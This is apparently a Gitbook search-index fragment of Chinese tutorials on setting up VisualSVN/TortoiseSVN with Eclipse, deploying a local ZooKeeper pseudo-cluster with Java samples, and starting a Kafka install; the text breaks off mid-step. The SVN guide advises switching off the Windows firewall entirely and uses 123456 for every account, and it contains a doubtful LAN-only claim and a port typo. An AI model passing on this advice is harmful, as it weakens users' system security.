Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/scm/VisualSVN使用手册.html":{"url":"markdown/notes/scm/VisualSVN使用手册.html","title":"VisualSVN 使用手册","keywords":"","body":"VisualSVN 使用手册1. VisualSVN Server简介2. TortoiseSVN简介3. VisualSVN Server的安装4. VisualSVN Server的配置5. TortoiseSVN的安装6. VisualSVN Server与TortoiseSVN的基本组合使用7. 资源的同步与共享7.1. 浏览器连接SVN服务器查看和下载资源7.2. TortoiseSVN的Checkout功能导出SVN服务器资源8. Eclipse的SVN插件安装9. Eclipse与SVN服务器的连接10. 利用SVN插件进行代码的同步与共享10.1. 从SVN服务器上把代码同步到本地10.2. 把本地的代码共享到SVN服务器10.3. 本地代码与服务器代码的更新和冲突处理11. *版本控制资源下载VisualSVN 使用手册 —— By EXP 2012.02.14 第 2 次修订 1. VisualSVN Server简介 介绍VisualSVN Server之前，首先说说Subversion。 Subversion是一个自由，开源的版本控制系统。在Subversion管理下，文件和目录可以超越时空。Subversion将文件存放在中心版本库里。这个版本库很像一个普通的文件服务器，不同的是，它可以记录每一次文件和目录的修改情况。这样就可以籍此将数据恢复到以前的版本，并可以查看数据的更改细节：做了哪些修改，谁做的修改，等等。正因为如此，许多人将版本控制系统当作一种神奇的“时间机器”。 Subversion的版本库可以通过网络访问，从而使用户可以在不同的电脑上进行操作。从某种程度上来说，允许用户在各自的空间里修改和管理同一组数据可以促进团队协作。因为修改不再是单线进行（单线进行也就是必须一个一个进行），开发进度会进展迅速。此外，由于所有的工作都已版本化，也就不必担心由于错误的更改而影响软件质量—如果出现不正确的更改，只要撤销那一次更改操作即可。 某些版本控制系统本身也是软件配置管理系统（如SCM），这种系统经过精巧的设计，专门用来管理源代码树，并且具备许多与软件开发有关的特性—比如，对编程语言的支持，或者提供程序构建工具。不过Subversion并不是这样的系统。它是一个通用系统，可以管理任何类型的文件集。 VisualSVN和Subversion一样，都是版本控制器SVN的服务端，一个重要区别是VisualSVN比Subversion配置起来容易的多了。 如果直接使用Subversion，那么在Windows 系统上，要想让它随系统启动，就要封装SVN Server为Windws service，还要通过修改配置文件来控制用户权限，另外如果要想以Web方式（http协议）访问，一般还要安装配置Apache，如果是新手，岂不是很头痛？ 而VisualSVN Serve集成了Subversion和Apache，省去了以上所有的麻烦。安装的时候SVN Server已经封装为Windws service，Apache服务器的配置也只是在图像界面上，指定认证方式、访问端口等简单操作；另外，用户权限的管理也是通过图像界面来配置。 需要知道的是，VisualSVN和VisualSVN Server又有一定区别，两者虽然同是SVN的服务端，但前者是收费的，后者是免费的。 还有一点， 用VisualSVN Server所搭建的服务器仅能在局域网下工作，这是团队开发中必须要注意的，所有成员都必须在同一局域网才能进行资源的同步与共享。一旦客户机与服务机跨越了路由，便无法相连。 2. TortoiseSVN简介 TortoiseSVN 是 Subversion 版本控制系统的一个免费开源客户端，可以超越时间的管理文件和目录。 实际上安装TortoiseSVN后，它是以一种类似“右键插件”的方式存在，使用TortoiseSVN能够更方便地管理SVN服务器上的资源，在团队开发中能够更有效实时地共享所有资源。 这里使用TortoiseSVN的一个主要原因是为了使用它的一个基本功能：把代码或资源迁入SVN服务器以达到同步共享的目的。 3. VisualSVN Server的安装 先到网上下载VisualSVN Server的最新版（当前为2.1.10）。 运行 VisualSVN-Server-2.1.10.msi 安装程序后，点击Next按钮继续。 勾选“I accept the terms in the License Agreement”选择框，点击Next按钮继续下一步操作。 选择完全安装方式，点击Next按钮继续。 到这里开始要注意： “Location”为VisualSVN Server的安装目录，可任意选择。 “Repositories”为SVN代码仓库的位置，即在使用时共享资料的位置，因此基于方便使用的考虑，不建议该位置设置太深（一般在磁盘根目录下再建一层即可），否则以后使用时同步资源库不方便。 “Server Port”为服务端口选择，后面有一个选择框“Use secure connection”。不勾选该选择框为使用快速链接【http协议】，此时供选择的端口有80/81/8080三个；勾选该选择框为使用安全链接【https协议】，这时的端口只有433/8433二个可用。 一般建议选择安全链接【https协议】，即勾选选择框，端口使用默认的即可。设置完毕点击Next按钮继续下一步，然后一直到安装完成即可。 4. VisualSVN Server的配置 安装完VisualSVN Server后，运行VisualSVN Server Manger，启动界面，其中： “Status”为SVN服务器状态，包括运行状态和服务器URL地址。 “Logging”为服务器日志。 “Subversion Authentication”为账户（User和Groups）信息。 “Repositories”为SVN代码库信息。 首先添加一个代码库。右击“Repository”，出现下图所示的右键菜单，任意选择一种方式均可创建一个新的代码库。 然后在文本框中输入代码库名称。 需要注意的是，若选择框“Creat default structure”被选中，则在代码库StartKit下面会创建trunk、branches、tags三个子目录；不选中，则只创建空的代码库StartKit。点击OK按钮，代码库StartKit则创建成功。 创建完代码库后，没有任何内容在里面。添加内容的方法会在后面说明，这里暂且略过。 下面，开始创建用户Users。在左侧的Users上点击右键，出现下图所示的右键菜单，任意选择一种方式均可创建一个新的用户。 然后设置新用户的用户名和密码。输入信息后，点击OK按钮，就创建一个用户了。按照这种方式，创建4个用户：starter、Developer1、tester1、manager1。 然后把这些用户授权给刚才创建的代码库StartKit。只有被授权的用户才能使用StartKit代码库内的资源，与其他用户进行资源共享。具体方法如下： 首先右击刚才创建的代码库StartKit, 选择“Properties”，弹出如下界面： 点击\"Add...\"按钮，然后选择刚才创建的4个新用户，点击OK按钮则完成了授权工作。 [info] 大家可能注意到了图中的Groups。是的，我们也可以先创建组，把用户添加到各个组中，然后对组进行授权，操作比较简单，在此略过。 把用户授权给代码库后，还要继续对每个用户（或组）进行详细的权限设置： “No Access”为禁止该用户访问代码库。 “Read Only”为虽然用户可以访问代码库，但只有读资源的权限。 “Read / Write”为用户不但可以访问代码库，还能对其中的资源进行读或写。 需要注意的是，在用户列表中存在一个“Everyone”用户，为缺省用户，暂时无视之即可。 设置完权限后，点击“确定”按钮，这4个用户就具有了访问StartKit代码库的不同权限。 本例中各个用户的权限说明： 用户starter：在团队中是新来者，不希望他向代码库中提交新代码，所以他只能读取代码库中的代码，不能提交代码。 用户tester1：是测试人员，不负责代码编写，所以也是只读权限。 用户Developer1：是开发人员，自然具有读写的权限。 用户manager1：是项目经理，自然具有读写的权限。 在实际的项目开发过程中，Developer和tester往往不可能只有一个人，这时候使用组来授权会更加方便。 5. TortoiseSVN的安装 先到网上下载TortoiseSVN的最新版（当前为1.7.2）。 运行 TortoiseSVN-1.7.4.22459-x64-svn-1.7.2.msi安装程序后，点击Next按钮继续。 此时点选“I accept the terms in the License Agreement”选择框，点击Next按钮继续下一步操作。 然后选择安装目录，任意即可。设置完毕点击Next按钮继续下一步，然后一直到安装完成。 点击Finish按钮后TortoiseSVN即安装完毕，但此时可能会提示重启系统，其实不重启也没有关系。 6. VisualSVN Server与TortoiseSVN的基本组合使用 注意在使用SVN服务之前，要先确保关闭Windows防火墙，否则可能出现无法连接到SVN服务器的情况。 关闭Windows防火墙的方法是： 右击计算机 -> 属性 -> 系统和安全 -> Windows防火墙 -> 打开或关闭Windows防火墙 为方便下文说明，这里重新配置了一下VisualSVN Server： SVN资源库为CodeLib（代码库）和FileLib（文件库），其所在的位置可在VisualSVN Server启动界面查得： 用户及其权限分别为：（Everyone是缺省用户，暂无视之） CaiZhenBiao Read Only DengWeiWen Read Only LiaoQuanBin Read/Write LiJianCong Read Only 这里设置4个用户的密码均为123456。 然后说一下用TortoiseSVN把源代码迁入SVN服务器的例子。 首先在Eclipse新建项目TestSVN： 然后打开Eclipse的工作空间，可以找到项目TestSVN的文件夹，如下图： 右击要迁入SVN服务器的项目文件夹TestSVN，可以看到TortoiseSVN出现在右键选项中。若选择Setting则可进行相关的设置，这里不做详细说明。我们选择Import把项目TestSVN迁入SVN服务器。 此时弹出如下图所示的界面， URL ： https://Exp-PC/svn/CodeLib 就是当前要迁入的SVN服务器地址。其中 https://Exp-PC/ 是服务器名，svn是代码库的根目录，CodeLib就是刚才添加的代码库。 注意上图中左下角的“Include ignored files”，在第一次迁入源代码时没有用，可以不勾选。但是，在以后提交代码的时候是非常有用的。 点击OK按钮后则自动把TestSVN项目迁入了SVN服务器。迁入过程如下图所示。迁入完成后再点击OK关闭窗口。 此时在VisualSVN Server中点击CodeLib，可在右方看到刚才迁入SVN服务器的源代码（如下图），若没有显示，右键刷新即可。 注意：也可从这里的灰色条栏中看到当前代码库CodeLib的URL地址。 不难发现项目TestSVN的项目文件夹没有了，在CodeLib中只保留了其项目内容。这是因为“根文件夹默认不上传”，因此要把整个TestSVN项目（包括项目文件夹在内）都上传到SVN服务器，可以把整个项目复制到任意一个空文件夹A中，使得文件夹A作为根文件夹，再右击文件夹A进行上传。效果如下图所示。 [info] 资源上传到SVN服务器的是资源的副本，因此一旦资源被上传，即使在本地删除也不会对服务器中的资源有任何影响。 7. 资源的同步与共享 第6节 介绍了如何利用TortoiseSVN把源代码上传到SVN服务器，其实上传非代码的其他资源也是同样的方法，把所需上传的资源（如Word、Excel、*.rar等）放在文件夹内，右键Import即可。同样要注意的是“根文件夹默认不上传”。 本节主要介绍怎样读取已上传到SVN服务器的指定资源的方法，主要有三种： （1）浏览器连接SVN服务器查看和下载资源； （2）TortoiseSVN的Checkout功能导出SVN服务器资源； （3）Eclipse连接SVN服务器查看和导出资源。 方法（3）要在Eclipse安装SVN插件后（见 第8节）才能使用，这将在 第9节 和 第10节 介绍。所以在本节中主要介绍方法（1）和方法（2）。 7.1. 浏览器连接SVN服务器查看和下载资源 要通过浏览器连接SVN服务器，首先需要获取SVN服务器的URL地址，URL地址的获取方法如下图所示： 打开VisualSVN Server界面，右击想要连接的代码库CodeLib，点选“Copy URL to Clipboard”即把代码库的URL复制到剪贴板。 然后把URL黏贴到浏览器地址栏回车即可。 [info] 部分浏览器可能会拦截，如火狐浏览器可能会出现下图的警告。此时点击“我已充分了解可能的风险”，然后点击“添加例外”，“确认安全例外”即可。 同时请确认windows防火墙已关闭。 其他浏览器也是类似的信任安全操作。 通过浏览器拦截后，会弹出身份认证窗口。此时只需要把刚才在VisualSVN Server中设置的4个用户之中的一个账号密码输入即可。然后浏览器就会反馈出当前SVN服务器所保有的资源。 下载界面如下： 7.2. TortoiseSVN的Checkout功能导出SVN服务器资源 在任意空白位置点击鼠标右键，在弹出的功能菜单中选择“SVN Checkout”。 如上图所示（下述的“检出”实质就是把SVN服务器上的资源复制一份副本到本地）： “URL of repository”为要检出资源的SVN资源库地址。 “Checkout directory”为要检出到的位置，可自由选择。 “Checkout Depth”为检出资源的深度，默认为把整个数据库的资源都检出。若要指定检出的项目，可点击“Choose item”按钮进行选择，只勾选需要检出的资源，然后点选OK按钮。 “Revision”为版本控制选项，功能很重要，将在第11节叙述相关作用。 “Show log”为显示被选中的服务器的操作日志。 如上图为检出过程。 如下图为检出后的资源文件。其中左下角的Icon若为“绿色√”说明本地资源与服务器资源一致。当本地资源被修改后，“绿色√”变成“红色！”，说明本地资源与服务器资源不一致。 而关联本地与服务器资源一致性的功能由“.svn”文件夹实现，该文件夹默认为隐藏。当删除“.svn”文件夹后本地与服务器断开连接，Icon消失。 8. Eclipse的SVN插件安装 首先安装Eclipse关于SVN的插件。这里使用Eclipse在线安装插件的方法。 Google搜索“SVN Eclipse插件”即可很容易找到SVN插件的安装地址，当前的安装地址为：http://subclipse.tigris.org/update_1.6.x 。 然后打开Eclipse -> Help -> Install New Software。 把地址 http://subclipse.tigris.org/update_1.6.x 复制到“Work with”下按回车，等待加载如下图的3个插件，点击 “Select all”按钮选中全部，然后点击Next按钮执行下一步，按提示操作即可完成安装。可能安装的时间较漫长，请耐心等待。 9. Eclipse与SVN服务器的连接 安装SVN插件后，找到Eclipse左下角的“+”（快速视图菜单），再点击打开快速视图菜单，选择Other。在弹出的界面中输入“SVN”，点选搜索到的“SVN资源库”，点击OK按钮确认。 此时会出现SVN资源库窗口（如下图）。在空白处右击，选择“新建”，在点选“资源库位置”。然后在弹出的窗口输入SVN服务器的地址，这里使用前面创建的代码库的URL地址：https://Exp-PC/svn/CodeLib 。地址无误则点击Finish按钮确定。 此时会弹出如下图所示的对话框，选择“永久接受”，然后输入用户名和密码。这里必须使用授权给当前正在同步的SVN资源库的用户。 前面第6节中，配置给CodeLib代码库的用户有4个，这里选择其中的一个即可，为避免以后再输入账户密码，可选择“保存密码”。 此时已经可以看到SVN服务器上的代码库，展开则可看到保存在SVN服务器的资源。 10. 利用SVN插件进行代码的同步与共享 10.1. 从SVN服务器上把代码同步到本地 打开Eclipse的“SVN资源库”，找到要下载的源代码项目，右击该项目的根文件夹，选择“检出为”则可把服务器上的项目同步到本地。 如上图所示，检出时会提示命名项目名称，任意命名均可（只要与本地已有项目不重名）。命名完毕后直接按Finish按钮。 此时返回本地Project目录，即可看到刚才从SVN服务器同步下来的TestSVN项目。 如下图所示，从服务器上同步到本地的项目，可以在左边项目列表看到该源代码的来源，以及最后被更新的时间和用户信息。 10.2. 把本地的代码共享到SVN服务器 新建项目TestSVNUpdata，右击项目文件夹，选择Teamshare project在弹出的界面中选择“SVN”，点击Next按钮继续。 如下图所示，选择“使用已有资源库位置”，然后在资源库地址列表中点选要上传的SVN服务器，点击Next按钮继续下一步。若资源库地址列表为空，则选择“创建新的资源库的位置”，输入要上传的SVN服务器的URL地址即可。 到这步选择“使用项目名做为文件夹名”，点Finish后自动切换到Synchronize标签，其中Synchronize显示的是为等待同步到服务器的项目，这里只有项目TestSVNUpdata可供选择。右击TestSVNUpdata项目文件夹，选择“提交”。 然后弹出下图的界面，勾选全部，点击OK按钮。 切换回到“SVN资源库”标签，右击刚才所上传到的SVN资源库，选择“刷新”，则可看到刚才上传的项目，上传成功。 10.3. 本地代码与服务器代码的更新和冲突处理 在说明更新和冲突处理之前，先解释一下各种SVN图标含义。 当本地的项目是从SVN服务器上更新下来的时候，若本地或SVN服务器的代码有被修改过，则当进行如此操作时：在“Project Explorer”标签的本地项目上点击右键 Team 与资源库同步（“与资源库同步”仅是在本地和服务器进行比对，暂时并不会使得本地或服务器代码有任何改变）。 这时会在“Synchronize”标签中列出本地与SVN服务器上不一致的文件列表。文件列表中各个文件的右方会根据不同的情况出现不同的Icon（即SVN图标），它们的含义分别为： 灰色向右箭头：本地修改过； 蓝色向左箭头：SVN上修改过； 灰色向右且中间有个加号的箭头：本地比SVN上多出的文件； 蓝色向左且中间有个加号的箭头：SVN上比本地多出的文件； 灰色向右且中间有个减号的箭头：本地删除了而SVN上未删除的文件； 蓝色向左且中间有个减号的箭头：SVN上删除了而本地未删除的文件； 红色双向箭头：SVN上修改过,本地也修改过的文件。 10.3.1. 更新处理 更新主要有两种操作形式： （1）从本地提交到服务器； （2）从服务器覆盖/更新到本地。 前者主要用于开发进度的更新，后者主要用于从服务器的备份恢复本地错误。两种操作都比较简单，在核对完本地和服务器代码后，只需在“Synchronize”标签中选中需要更新的文件（或文件夹），然后点击右击，找到“Team”，此时选择“提交”则是进行操作（1），选择“覆盖/更新”则是进行操作（2）。具体要进行哪种操作应该视情况而定，这里不再详细说明。 10.3.2. 冲突处理 产生冲突的原因很多，最普遍的一个原因就是：假设服务器上有源代码x，开发者A从服务器上复制了x的副本x1到本地Ax进行开发，开发者B从服务器上复制了x的副本x2到本地Bx进行开发。 当开发者A首先完成了他的开发任务时，此时其本地Ax的源代码就是x1*，当他x1*提交到服务器上后，服务器的源代码就被更新为x1*。 此后开发者B也完成了它的开发任务，此时其本地Bx的源代码就是x2*，当他试图把x2*提交到服务器上时，就出现了冲突。因为此时服务器的代码不再是x，而是被A修改过的x1*。x1*中不但有A增加的代码，原本x中还可能有被A删改过的地方。 此时B要提交代码x2*，就必须根据服务器的代码x1*先把x2*进行恰当的修改，使得修改后的x2**不但包含B的开发部分，还比包含A开发的x1*部分。 如下图所示为产生冲突的一种情况，Eclipse的SVN插件自动指出了本地与服务器不同或冲突的部分，B就能根据这些提示在本地进行修改再提交。结合下图在本地进行如下修改： （a）本地第6行由于是在本地被无故修改的，因此根据服务器进行恢复 （b）本地第8行需要保留，因此不修改 （c）服务器第8行需要被保留，因此复制到本地 （d）服务器第10行不需要保留，因此不复制到本地 （e）服务器第12行需要保留，复制到本地 （f）本地第10行不需要保留，删除 修改后如下图所示，此时冲突已解决，本地保存后，右击代码文件 -> Team -> 提交，即可更新到服务器。 11. *版本控制 版本控制已在 第7.2节 介绍TortoiseSVN的Checkout功能时粗略提及过，本节将详细介绍如何利用Eclipse的SVN插件进行版本控制。TortoiseSVN的版本控制原理雷同，因此不再详细介绍，读者可自行摸索。 以下为示例。 如下图所示，首先在Eclipse建立一个新的本地项目“版本控制测试”。 然后把该项目上传到SVN服务器：右击项目文件夹 -> Team -> Share project。 然后按下图依次进行操作。 到这步为止，为当前提交到服务器的项目在“编辑提交注释”一栏中填写版本信息。这步很重要，是作为以后版本控制的依据。 填写完版本信息后，点击Finish按钮，自动跳转到“Synchronize”标签（同步标签），在同步列表中出现等待同步到服务器的项目。右击“版本控制测试”项目的文件夹，选择“提交”，然后按提示操作即可把“版本控制测试”项目连同其版本信息写入SVN服务器。 [info] 若提交对话框的注释栏为空，请重新填写版本信息，也可利用下拉选择。 此时SVN服务器上只有“版本控制测试”项目的1.0版本。 现在回到本地，现在对本地的“版本控制测试”项目进行修改： 然后右击项目文件夹，选择“Team”，选择“与资源库同步”。自动跳转到“Synchronize”标签（同步标签）。右击“版本控制测试”项目的文件夹，选择“提交”。在出现的提交界面中填写新的版本号。 确认上传后，现在SVN服务器已经有了“版本测试控制”项目的1.0版本和2.0版本。虽然在SVN资源库中依然只有一个“版本测试控制”项目，这是因为SVN资源库默认是显示项目的最新版本。 注意此时服务器上有两个版本1.0和2.0，而本地上只有最新的版本2.0。 下面我们试图把本地的版本恢复到1.0： 在资源库中右击“版本控制测试”，选择“检出为”。 可以看到“Check out HEAD revision”默认是被勾选的，表示从服务器检出最新版本（当前为2.0）的项目到本地。 “Depth”为检出深度，默认为选中的整个资源文件，按需设置，这里为默认值。 “Check out HEAD revision”下方有“Revision”，这里是填写希望检出的版本号，这里先不急着填，先点击“显示日志”。 如上面几张图所示，可以看到点击“显示日志”后，出现了关于项目“版本控制测试”的修改日志列表，日志列表下方对应的是当前被选中的版本号的详细修改信息。但是出现了两个“最初版本1.0”和一个“版本2.0”。现在希望把本地项目恢复到1.0版本，应该选择哪个呢？ 不难发现，最底下的“最初版本1.0”的修改信息只有1个空文件夹，那是之前我们把项目第一次同步到服务器时产生的：我们实际上分开了两步上传，先在服务器创建了项目文件夹，然后再上传项目文件，而这两次操作我们都编写了同一个版本号信息，因此会出现这种情况。 而中间的“最初版本1.0”的修改信息则是整个项目的内容，那么显然现在我们要恢复到的是中间的“最初版本1.0”，即修订号为85的版本。 至于“版本2.0”的修改信息只有“VersionTest.java”一个文件，这也是因为我们只对这个文件做了修改的缘故。 现在我们选择“最初版本1.0”（修订号为85）的版本，点击OK按钮。自动返回到检出界面，而“Check out HEAD revision”已不再被勾选，“Revision”一栏自动被填写了对应修订号85。点击Finish按钮，提示覆盖本地项目，点击OK按钮即可。 返回本地项目查看，已被恢复至1.0版本（如下图）。 类似地，现在也可以从服务器中把最新的版本2.0重新检出到本地，方法一样，具体步骤不再阐明。 资源下载 本文全文下载 配套PPT讲义下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/arch/":{"url":"markdown/notes/arch/","title":"系统架构","keywords":"","body":"系统架构系统架构 快速部署单机 zookeeper 集群 快速部署单机 kafka 集群 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/arch/快速部署单机zookeeper集群.html":{"url":"markdown/notes/arch/快速部署单机zookeeper集群.html","title":"快速部署单机 zookeeper 集群","keywords":"","body":"快速部署单机 zookeeper 集群（win环境）1. 前言2. 环境3. 安装4. 配置5. 运行6. 管理zookeeper节点7. 使用Java测试zookeeper集群7.1. 官方样例7.2. Github样例（更精简的zk客户端）资源下载快速部署单机 zookeeper 集群（win环境） 1. 前言 本文不讲zookeeper集群原理，只谈部署步骤。 默认读者已对zookeeper有最基本的认知，纯粹作为部署笔记，方便回忆。 另外本文是基于Windows部署的，Linux的步骤是基本相同的（只是启动脚本位置不同）。 严格来说本文部署的是单机伪集群，但一理通百理明，多主机集群和单机伪集群的部署方式相差无几，从入门角度看，使用方式也是大同小异。 2. 环境 JDK ： 1.8 zookeeper ： 3.4.7 zookeeper集群规模 ： 3 zookeeper安装目录 ：%INSTALL_DIR% = E:\\apache\\apache-zookeeper 　　　（此处定义变量是为了下文方便说明，实际部署时应使用实际路径而非变量） 3. 安装 到zookeeper官网下载最新版：https://zookeeper.apache.org/ 解压后，复制并重命名到3个目录（每个目录代表zookeeper集群的一台机器）： %INSTALL_DIR%/zookeeper-1 %INSTALL_DIR%/zookeeper-2 %INSTALL_DIR%/zookeeper-3 分别复制这三个目录下的配置文件： %INSTALL_DIR%/zookeeper-x/conf/zoo_sample.cfg 并重命名为： %INSTALL_DIR%/zookeeper-x/conf/zoo.cfg 4. 配置 修改配置文件 %INSTALL_DIR%/zookeeper-1/conf/zoo.cfg 的参数如下（注意实际部署时把变量 %INSTALL_DIR% 改成实际路径）： dataDir=%INSTALL_DIR%/zookeeper-1/data dataLogDir=%INSTALL_DIR%/zookeeper-1/log clientPort=2181 server.1=localhost:2287:3287 server.2=localhost:2288:3288 server.3=localhost:2289:3289 修改配置文件 %INSTALL_DIR%/zookeeper-2/conf/zoo.cfg 的参数如下（注意实际部署时把变量 %INSTALL_DIR% 改成实际路径）： dataDir=%INSTALL_DIR%/zookeeper-2/data dataLogDir=%INSTALL_DIR%/zookeeper-2/log clientPort=2182 server.1=localhost:2287:3287 server.2=localhost:2288:3288 server.3=localhost:2289:3289 修改配置文件 %INSTALL_DIR%/zookeeper-3/conf/zoo.cfg 的参数如下（注意实际部署时把变量 %INSTALL_DIR% 改成实际路径）： dataDir=%INSTALL_DIR%/zookeeper-3/data dataLogDir=%INSTALL_DIR%/zookeeper-3/log clientPort=2183 server.1=localhost:2287:3287 server.2=localhost:2288:3288 server.3=localhost:2289:3289 同时，分别在3个%INSTALL_DIR%/zookeeper-x/data 目录下，新建一个名为 myid 文件，其中： %INSTALL_DIR%/zookeeper-1/data/myid 中的内容为1，对应server.1中的1 %INSTALL_DIR%/zookeeper-2/data/myid 中的内容为2，对应server.2中的2 %INSTALL_DIR%/zookeeper-3/data/myid 中的内容为3，对应server.3中的3 关于zoo.cfg配置文件的部分配置参数说明： tickTime ： zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，亦即每个 tickTime 时间就会发送一个心跳。 dataDir ： zookeeper 保存数据的目录，默认情况下，zookeeper 将写数据的日志文件也保存在这个目录。 clientPort ： 客户端连接 zookeeper 服务器的端口，zookeeper 会监听这个端口，接受客户端的访问请求。 initLimit ： zookeeper 接受客户端（不是用户连接 zookeeper 服务器的客户端，而是 zookeeper 服务器集群中连接到 Leader 的 Follower 服务器）初始化连接时最长能忍受多少个心跳时间间隔数。 syncLimit ： 标识 Leader 与 Follower 之间发送消息，请求和应答时间长度，最长不能超过多少个 tickTime 的时间长度。 server.A=B:C:D ： 　其中： 　　A 是一个数字，表示这个是第几号服务器。 　　B 是这个服务器的 ip 地址。 　　C 是这个服务器与集群中的 Leader 服务器交换信息的端口。 　　D 是在执行选举时，服务器相互通信的端口：万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的 Leader，就是用这个端口。 　　如果是（如本文所述的）伪集群的配置方式，由于 B 都是一样，而不同的 zookeeper 实例通信端口号不能一样，此时要给C、D分配不同的端口号。 5. 运行 在 %INSTALL_DIR% 目录下新建一个 run-all-zk.bat 脚本，内容如下（注意实际部署时把变量 %INSTALL_DIR% 改成实际路径）： start %INSTALL_DIR%/zookeeper-1/bin/zkServer.cmd start %INSTALL_DIR%/zookeeper-2/bin/zkServer.cmd start %INSTALL_DIR%/zookeeper-3/bin/zkServer.cmd 这样只需运行 run-all-zk.bat 脚本，即可启动整个zookeeper集群。 至此 zookeeper 部署完成 。 6. 管理zookeeper节点 若要管理zookeeper节点，推荐使用工具：ZKInspector 启动后，输入连接字符串即可连接到zookeeper： localhost:2181,localhost:2182,localhost:2183 此工具可以很方便地增删改查zookeeper当前的节点状态和内容。 7. 使用Java测试zookeeper集群 7.1. 官方样例 官方的Maven原生构件： org.apache.zookeeper zookeeper 3.4.6 官方测试代码： import org.apache.zookeeper.CreateMode; import org.apache.zookeeper.WatchedEvent; import org.apache.zookeeper.Watcher; import org.apache.zookeeper.ZooDefs; import org.apache.zookeeper.ZooKeeper; import org.apache.zookeeper.data.Stat; /** * * apache-zookeeper测试 * * PROJECT : zookeeper * SUPPORT : www.exp-blog.com * @version 2018-08-02 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ public class TestZooKeeper { public static void main(String[] args) throws Exception { new TestZooKeeper().test(); } public void test() throws Exception { final String CHARSET = \"UTF-8\"; /* 连接到zookeeper集群 */ final String ZK_CONN_STR = \"127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183\"; final int sessionTimeout = 300000; NodeWatcher nodeWatcher = new NodeWatcher(); // zookeeper节点监视器(当节点发生变化时, 会触发此监视器) ZooKeeper zk = new ZooKeeper(ZK_CONN_STR, sessionTimeout, nodeWatcher); /* * 阻塞等待连接到zookeeper集群. * 若zookeeper已经启动一段时间是不需要循环检测的，此方法目的是兼容zookeeper刚刚启动的情况. */ while(!zk.getState().equals(ZooKeeper.States.CONNECTED)) { Thread.sleep(1000); } /* 若zookeeper节点不存在，则创建之 */ String nodePath = \"/zk-test-node\"; // 节点位置 Stat stat = zk.exists(nodePath, false); if(stat == null) { String nodeData = \"http://exp-blog.com\"; // 节点数据 // 创建一个持久化节点(即在zookeeper服务停止后依然可以保存该节点数据) // 与之相对的则是 CreateMode.EPHEMERAL 临时节点(即在zookeeper服务停止后该节点数据丢失) zk.create(nodePath, nodeData.getBytes(CHARSET), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT); } /* 从zookeeper节点上读取数据 */ byte[] bytes = zk.getData(nodePath, false, stat); String nodeData = new String(bytes, CHARSET); System.out.println(nodeData); /* 断开zookeeper连接 */ zk.close(); } /** * * zookeeper节点监视器(当节点发生变化时, 会触发此监视器) * * PROJECT : zookeeper * SUPPORT : www.exp-blog.com * @version 2018-08-02 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ private class NodeWatcher implements Watcher { @Override public void process(WatchedEvent event) { System.out.println(\"-----------\"); System.out.println(\"path:\" + event.getPath()); System.out.println(\"type:\" + event.getType()); System.out.println(\"stat:\" + event.getState()); System.out.println(\"-----------\"); } } } 7.2. Github样例（更精简的zk客户端） zkclient的Maven构件： com.github.adyliu zkclient 2.1.1 zkclient测试代码： import com.github.zkclient.ZkClient; /** * * zkClient测试 * * PROJECT : zookeeper * SUPPORT : www.exp-blog.com * @version 2018-08-02 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ public class TestZooKeeperClient { public static void main(String[] args) throws Exception { /* 连接到zookeeper集群 */ final String ZK_CONN_STR = \"127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183\"; ZkClient zkClient = new ZkClient(ZK_CONN_STR); /* 若zookeeper节点不存在，则创建之 */ String nodePath = \"/zk-test-node\"; // 节点位置 if (!zkClient.exists(nodePath)) { String nodeData = \"http://exp-blog.com\"; // 节点数据 // 创建一个持久化节点(即在zookeeper服务停止后依然可以保存该节点数据) // 与之相对的则是 createEphemeral 临时节点(即在zookeeper服务停止后该节点数据丢失) zkClient.createPersistent(nodePath, nodeData.getBytes()); } /* 从zookeeper节点上读取数据 */ String nodeData = new String(zkClient.readData(nodePath)); System.out.println(nodeData); } } 资源下载 本文全文下载 ZKInspector 下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/arch/快速部署单机kafka集群.html":{"url":"markdown/notes/arch/快速部署单机kafka集群.html","title":"快速部署单机 kafka 集群","keywords":"","body":"快速部署单机kafka集群（win环境）1. 前言2. 环境3. 安装4. 配置5. 运行7. 使用Java测试kafka消息发布/订阅8. 附录1：kafka常见的错误与解决方法9. 附录2：server.properties参数说明资源下载快速部署单机kafka集群（win环境） 1. 前言 本文不讲kafka集群原理，只谈部署步骤。 默认读者已对kafka有最基本的认知，纯粹作为部署笔记，方便回忆。 另外本文是基于Windows部署的，Linux的步骤是基本相同的（只是启动脚本位置不同）。 由于kafka的运行依赖于zookeeper，所以在运行kafka之前，需要先安装并运行zookeeper。不过本文没有使用kafka内置的zookeeper，而是使用《快速部署单机zookeeper集群（win环境）》里的zookeeper集群，但原理是相同的。 2. 环境 JDK ： 1.8 zookeeper ： 3.4.7 zookeeper集群规模 ： 3 kafka ： 2.12-2.0.0 kafka集群类型： single broker（单节点单boker集群，亦即kafka只启一个broker消息中间件服务，producer、consumer、broker均通过zookeeper集群交换消息，具体可参考这篇文章：《kafka集群的三种部署方式》） kafka安装目录 ： %INSTALL_DIR% = E:\\apache\\apache-kafka 　　（此处定义变量是为了下文方便说明，实际部署时应使用实际路径而非变量） 3. 安装 到kafka官网下载最新版：http://kafka.apache.org/ 解压并重命名到 %INSTALL_DIR% 目录。 4. 配置 修改配置文件 %INSTALL_DIR%/config/log4j.properties ，找到参数 log4j.rootLogger ，在其前面一行添加如下参数（注意实际部署时把变量 %INSTALL_DIR% 改成实际路径）： kafka.logs.dir=%INSTALL_DIR%/tmp/kafka-logs 修改配置文件 %INSTALL_DIR%/config/server.properties 的参数如下（注意实际部署时把变量 %INSTALL_DIR% 改成实际路径）： broker.id=0 port=9092 host.name=localhost log.dirs=%INSTALL_DIR%/tmp/kafka-logs num.partitions=1 zookeeper.connect=localhost:2181,localhost:2182,localhost:2183 5. 运行 修改 